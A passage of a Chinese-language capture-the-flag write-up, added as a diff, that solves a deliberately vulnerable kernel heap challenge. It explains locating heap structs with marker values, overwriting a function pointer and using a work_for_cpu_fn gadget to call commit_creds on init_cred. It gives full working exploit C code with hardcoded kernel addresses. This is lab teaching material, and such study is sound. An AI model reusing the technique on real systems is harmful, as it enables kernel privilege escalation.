@@ -526,3 +526,96 @@ int main() {
     return 0;
 }
 ```
+
+### Level-2
+
+建议阅读`Slab Allocators`和`Kernel Heap Protections`后再做这题
+
+又名“run_cmd引发的惨剧”
+
+ioctl提供的功能和上一题类似，不过少了读取flag的功能：
+- 任意大小的`_copy_from_user`
+- 任意大小的`_copy_to_user`
+- 调用一个堆上结构体的函数指针。结构体和函数指针均在`kheap_open`中配置
+
+很明显这题需要覆盖函数指针进而调用任意函数。打开两个fd后，两个结构体必定有一个在内存上位于另一个的前面。问题来了，是哪个呢？由于randomized freelist，我们并不能假设后打开的fd对应的结构体在先打开的fd对应的结构体后面。这点可以用标记值配合`_copy_to_user`解决
+
+接着我就跑去找run_cmd的地址了。然而`/proc/kallsyms`中竟然找不到run_cmd。搜了一下，发现较新的kernel版本已不再导出部分函数的符号，比如run_cmd。不过不导出符号不代表这个函数就不存在吧？`uname -r`显示版本是`6.7.9`，搜索对应版本的源码便能发现run_cmd： https://elixir.bootlin.com/linux/v6.7.9/source/kernel/reboot.c#L816 。发现内部调用了`call_usermodehelper`。问了chatgpt，用`objdump -d vmlinux > vmlinux.dis`反编译后再运行`grep -B30 -A30 "call_usermodehelper" vmlinux.dis`便能找到调用`call_usermodehelper`的函数的上下文
+
+理论上这应该能定位run_cmd的。结果我翻遍了grep的结果，根本没有函数符合run_cmd的上下文。确实存在两个函数同时调用了`argv_split`,`call_usermodehelper`和`argv_free`，然而调用的代码都是函数的一部分，没有额外调用run_cmd的逻辑。同时我还发现run_cmd这个函数全局只被引用了两遍。于是我猜测这个函数根本没有被编译成函数，因为调用次数太少，直接被内联进调用它的函数里了。悲伤的是，无法利用一次call满足所有调用的条件：rdi为固定值，rdx为0，rsi为执行的命令。最多满足rdi和rsi的条件
+
+然后我傻眼了。布什戈门，就给我一次调用，我能调用什么？无奈去社区服务器偷窥别人的思路。还真给我找到了一份截图： https://discord.com/channels/750635557666816031/1226332120998481980/1243381652575752226 。这位佬调用了`work_for_cpu_fn+5`。这是个啥？反编译一下看看：
+```
+   0xffffffff810a5570 <work_for_cpu_fn>:        endbr64
+   0xffffffff810a5574 <work_for_cpu_fn+4>:      push   rbx
+   0xffffffff810a5575 <work_for_cpu_fn+5>:      mov    rbx,rdi
+   0xffffffff810a5578 <work_for_cpu_fn+8>:      mov    rdi,QWORD PTR [rdi+0x28]
+   0xffffffff810a557c <work_for_cpu_fn+12>:     mov    rax,QWORD PTR [rbx+0x20]
+   0xffffffff810a5580 <work_for_cpu_fn+16>:     call   0xffffffff81ebe160 <__x86_indirect_thunk_array>
+   0xffffffff810a5585 <work_for_cpu_fn+21>:     mov    QWORD PTR [rbx+0x30],rax
+   0xffffffff810a5589 <work_for_cpu_fn+25>:     pop    rbx
+   0xffffffff810a558a <work_for_cpu_fn+26>:     ret
+   0xffffffff810a558b <work_for_cpu_fn+27>:     int3
+```
+非常好gadget，使我的大脑旋转（
+
+而且由于题目的设置，我们能够控制rdi指向的内容（注意无法控制rdi本身。rdi固定为A，但我们能控制A以及A+x指向的内容`[A+x]`），完美符合这个gadget的要求
+
+但是`commit_creds(prepare_kernel_cred(0))`需要调用两个函数而且需要获取返回值？不必担心，只要获取当前进程的`init_cred`的地址（`p &init_cred`）传入`commit_creds`即可。没有kaslr的情况下简直易如反掌
+```c
+#include <fcntl.h>
+#include <sys/ioctl.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <stdio.h>
+int main() {
+    int fd1 = open("/proc/kheap", O_RDWR);
+    int fd2 = open("/proc/kheap", O_RDWR);
+    char buf[0x1000];
+    size_t buf_len = sizeof(buf);
+    memset(buf, 0, sizeof(buf));
+    char marker1[]="AAAAAAAA";
+    char marker2[]="BBBBBBBB";
+    size_t marker_len = sizeof(marker1);
+    unsigned long arg[2];
+    arg[0]=(unsigned long)marker1;
+    arg[1]=sizeof(marker1);
+    ioctl(fd1,0x5701,arg);
+    arg[0]=(unsigned long)marker2;
+    arg[1]=sizeof(marker2);
+    ioctl(fd2,0x5701,arg);
+    arg[0]=(unsigned long)buf;
+    arg[1]=sizeof(buf);
+    ioctl(fd1,0x5700,arg);
+    char *pos1 = memmem(buf, buf_len, marker2, marker_len);
+    ioctl(fd2,0x5700,arg);
+    char *pos2 = memmem(buf, buf_len, marker1, marker_len);
+    if(pos1){ //不确定fd1在fd2前面还是反过来，都试一下
+        printf("Found at offset(pos1): %ld\n", (char *)pos1 - buf);
+        memcpy(pos1-8,"\x74\x55\x0a\x81\xff\xff\xff\xff",8);
+        memcpy(pos1+0x20,"\xb0\x8b\x0b\x81\xff\xff\xff\xff",8);
+        memcpy(pos1+0x28,"\x20\x2f\xa5\x82\xff\xff\xff\xff",8);
+        ioctl(fd1,0x5701,arg);
+        ioctl(fd2,0x5702,arg);
+        system("cat /flag");
+    }
+    else if(pos2){
+        printf("Found at offset(pos2): %ld\n", (char *)pos2 - buf);
+        memcpy(pos2-8,"\x74\x55\x0a\x81\xff\xff\xff\xff",8);
+        memcpy(pos2+0x20,"\xb0\x8b\x0b\x81\xff\xff\xff\xff",8);
+        memcpy(pos2+0x28,"\x20\x2f\xa5\x82\xff\xff\xff\xff",8);
+        ioctl(fd2,0x5701,arg);
+        ioctl(fd1,0x5702,arg);
+        system("cat /flag");
+    }
+    else{
+        printf("Nope\n");
+        return 0;
+    }
+    return 0;
+}
+```
+通过`sudo cat /proc/slabinfo`可以看到这题使用的slab的细节
+
+不过我发现调用`work_for_cpu_fn+5`会失败，因为函数末尾的`pop rbx`。老老实实从`push rbx`开始就行了
